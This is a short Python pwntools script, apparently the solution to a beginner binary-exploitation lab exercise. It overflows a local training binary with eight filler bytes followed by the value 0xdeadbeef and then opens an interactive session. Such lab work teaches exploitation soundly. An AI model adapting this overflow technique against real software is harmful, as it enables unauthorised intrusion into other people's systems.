#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex2")

# Fill in the first 8 bits of the input payload
deadbeef_number = 0xdeadbeef
payload = b"F" * 8 + p64(deadbeef_number, "little") # craft the payload

target.send(payload) # notice how we're not using 'sendline' so it does not add a newline

target.interactive()
